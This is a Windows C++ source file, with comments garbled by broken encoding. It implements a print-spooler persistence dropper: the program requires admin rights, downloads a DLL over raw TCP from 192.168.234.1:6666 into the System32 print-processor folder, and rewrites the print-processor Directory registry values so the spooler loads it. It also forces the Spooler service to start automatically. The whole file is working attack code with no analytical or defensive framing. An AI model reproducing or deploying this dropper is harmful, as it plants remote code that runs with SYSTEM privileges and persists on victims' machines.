#include<winsock2.h>
#include<windows.h>
#include<vector>
#include<string>

#pragma comment(lib,"ws2_32.lib")


//***** �����б� /*****/
void MakePath(std::string address, bool hidden = false); /*�����ļ���·��(������)*/
std::string CurrentPath(); /*��ȡ����ǰ·��*/
void WriteStrToRegTable(HKEY hkeyroot, std::vector<LPCSTR> sets, const char * name, std::string value); //�޸�ע���ֵ
bool IsRunAsAdmin(); /*����Ƿ����ڹ���ԱȨ��������*/
bool IsWin32(); /*���ϵͳ�Ƿ���32λ*/
bool FetchDll(std::string ipAddress, int port,std::string dllType, std::string storagePath); //��ָ������������dll�ļ���ָ��·��
bool ConfigureServiceStartType(std::string serviceName, DWORD startType); /*����Windows��������ģʽ*/


/***** ������� *****/
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
    //����Ƿ��ڹ���Աģʽ������
    if(!IsRunAsAdmin())
    {
        MessageBox(NULL, "���ڹ���ԱȨ�������б�����!", "ע��", MB_OK);
        return 0;
    }

    //Ԥ�ڴ��·��
    std::string path = "C:\\Windows\\System32\\spool\\prtprocs\\LBWNB";

    //STEP1: �����ļ��в�����DLL
    MakePath(path,false);
    std::string serverAddr = "192.168.234.1"; //DLL���ط�����IP��ַ
    int serverPort = 6666; //DLL���ط������˿ں�
    std::string dllType =  IsWin32() ? "DLL32" : "DLL64";
    if(!FetchDll(serverAddr, serverPort, dllType, path + "\\winprint.dll")) { return 0; }

    //STEP2: �޸�ע���(�ض�λĿ���dll·��)
    const int arysetsSize = 5;
    LPCSTR arysets[arysetsSize] = {
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows 4.0\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows ARM64\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows IA64\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows NT x86\\",
        "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\"
    };
    std::vector<LPCSTR> sets(arysets, arysets + arysetsSize);
    WriteStrToRegTable(HKEY_LOCAL_MACHINE, sets, "Directory", "LBWNB");

    //STEP3: ���÷����Զ�����
    ConfigureServiceStartType("Spooler", SERVICE_AUTO_START);

    MessageBox(NULL, "ִ�гɹ�,������ϵͳ!", "ע��", MB_OK);

    return 0;
}


/***** ����ʵ�ֲ��� *****/
//�����ļ���·��(������)
void MakePath(std::string address, bool hidden)
{
    std::vector<std::string> dirs; //�𼶱����ļ���·��
    int len = address.length();
    std::string temp = "";

    //����CreateDirecotryֻ���Զ�����һ��Ŀ¼����·��������ʱ��Ҫ�𼶴���Ŀ¼�����·���Ĵ���
    //�𼶲��Ŀ¼
    for (int i = 0; i < len; i++)
    {
        if (address[i] == '\\' || address[i] == '/') //Ҫ������һ���ļ����򱣴汾���ļ��е�����
        {
            dirs.push_back(temp);
            temp = "";
        }
        else //���������¼�����ļ�������
        {
            temp += address[i];
        }
    }
    dirs.push_back(temp);

    //�𼶵���CreateDirectory��������Ŀ¼����
    len = dirs.size();
    temp = dirs[0];
    for (int i = 1; i < len; i++)
    {
        temp += "\\" + dirs[i];
        CreateDirectory(temp.c_str(), NULL); //���Դ�����ǰ���ļ���Ŀ¼
        if(hidden) { SetFileAttributes(temp.c_str(), FILE_ATTRIBUTE_HIDDEN); } //����Ŀ¼
    }
}

//��ȡ����ǰ·��
std::string CurrentPath()
{
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    for(int i = strlen(path); i >= 0 && path[i] != '\\'; i--) { path[i] = '\0'; }
    return std::string(path);
}

//�޸�ע�����Ŀ
void WriteStrToRegTable(HKEY hkeyroot, std::vector<LPCSTR> sets, const char * name, std::string value)
{
    //����ע���ע����
    LPBYTE lpvalue = new BYTE[value.length()+1];
    const char * cstr = value.c_str();
    memcpy(lpvalue, (LPTSTR)(LPCSTR)cstr, value.length());
    lpvalue[value.length()] = '\0';
    DWORD dataLen = value.length() + 1;

    //���Է���ע���
    HKEY hKEY;

    for(int i = 0; i < sets.size(); i++)
    {
        if(RegOpenKeyEx(hkeyroot, sets[i], 0, KEY_WRITE, &hKEY) != ERROR_SUCCESS) { continue; }
        if(RegSetValueEx(hKEY, name, 0, REG_SZ, lpvalue, dataLen) != ERROR_SUCCESS) { continue; }
    }
}

//����Ƿ����ڹ���ԱȨ��������
bool IsRunAsAdmin() 
{
	bool bElevated = false;  
	HANDLE hToken = NULL;  
 
	//��ȡ��ǰ���̵ķ�������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) { return false; }
 
	TOKEN_ELEVATION tokenEle; //�ṹ�壬���������Ƿ�ӵ����ߵ�Ȩ��
	DWORD dwRetLen = 0; //������Ϣ�ĳ���
 
	//�������м��Ȩ��
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) 
	{  
		if (dwRetLen == sizeof(tokenEle)) 
		{
			bElevated = tokenEle.TokenIsElevated;  
		}
	}  

	CloseHandle(hToken); //��������ƺ����ر�
	return bElevated;  
}

//���ϵͳ�Ƿ���32λ
bool IsWin32()
{
    HKEY hKey;
    char value[40] = "";
    DWORD type = REG_SZ;
    DWORD size = sizeof(value);
    LPCSTR path = "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE , path, 0, KEY_READ, &hKey);
    RegQueryValueEx(hKey, "PROCESSOR_ARCHITECTURE", 0, &type, (LPBYTE)&value, &size);
    std::string res(value);

    bool is32 = res.find("64") == -1;

    return is32;
}

//��ָ������������dll�ļ���ָ��·��
bool FetchDll(std::string ipAddress, int port,std::string dllType, std::string storagePath)
{
    //��ʼ��socket��Դ
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    SOCKET dllLoadServer = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    //�������ӵ�ַ��Ϣ
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ipAddress.c_str());

    //���ӵ�������
    if(connect(dllLoadServer, (struct sockaddr*) &addr, sizeof(sockaddr)) == -1)
    {
        closesocket(dllLoadServer);
        MessageBox(NULL,"�޷��ӷ�������ȡע����,������������!", "ע��", MB_OK);
        return false;
    }

    //�����ļ�
    dllType += "\n";
    send(dllLoadServer, dllType.c_str(), dllType.length(), 0);

    //��ȡ�ļ�
    FILE * file = fopen(storagePath.c_str(), "wb");
    if(file == NULL) { return false; }
    int recvLength = 0;
    char byteBuffer[MAXBYTE];
    while((recvLength = recv(dllLoadServer, byteBuffer, MAXBYTE, 0)) > 0)
    {
        fwrite(byteBuffer, recvLength, 1, file);
    }
    fclose(file);
    
    //�ر�socket������socket��Դ
    closesocket(dllLoadServer);
    WSACleanup();

    return true;
}

//����Windows��������ģʽ
bool ConfigureServiceStartType(std::string serviceName, DWORD startType)
{
    SC_HANDLE schSCManager; //������������
    SC_HANDLE schService; //������ƾ��

    //�򿪷��������
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(schSCManager == NULL) { return false; }

    //�򿪷�����ƾ��
    schService = OpenService(schSCManager, serviceName.c_str(), SERVICE_CHANGE_CONFIG);
    if(schService == NULL) { return false; }

    //���÷�������״̬
    bool result = ChangeServiceConfig(
        schService, //������
        SERVICE_NO_CHANGE, //��������(����)
        startType, //����ģʽ
        SERVICE_NO_CHANGE, //����������(����)
        NULL, //���������·��(����)
        NULL, //����ָ����(����)
        NULL, //��ǩID(����)
        NULL, //��������(����)
        NULL, //�˻�����(����)
        NULL, //�˻�����(����)
        NULL //������ʾ����(����)
    );

    //�رմ򿪵ľ��
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return result;
}